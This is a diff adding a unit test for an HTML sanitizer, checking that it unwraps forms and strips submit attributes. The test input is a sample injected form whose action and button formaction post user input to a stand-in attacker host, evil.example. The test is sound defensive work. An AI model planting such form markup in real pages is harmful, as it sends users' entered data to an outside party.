@@ -28,3 +28,23 @@ def test_sanitize_interactive_html_strips_executable_content() -> None:
     assert "background-image" not in cleaned
     assert "<details" in cleaned
     assert "<input" in cleaned
+
+
+def test_sanitize_interactive_html_unwraps_forms_and_strips_submit_attrs() -> None:
+    raw = """
+    <form action="https://evil.example/collect" method="post">
+      <label>Choice <input type="checkbox" name="choice" form="external-form" checked /></label>
+      <button formaction="https://evil.example/button" formmethod="post">Submit</button>
+    </form>
+    """
+
+    cleaned = _sanitize_interactive_html(raw)
+
+    assert "<form" not in cleaned
+    assert "</form>" not in cleaned
+    assert "https://evil.example" not in cleaned
+    assert "action=" not in cleaned
+    assert "method=" not in cleaned
+    assert "form=" not in cleaned
+    assert "<label>" in cleaned
+    assert '<input type="checkbox" name="choice" checked="">' in cleaned
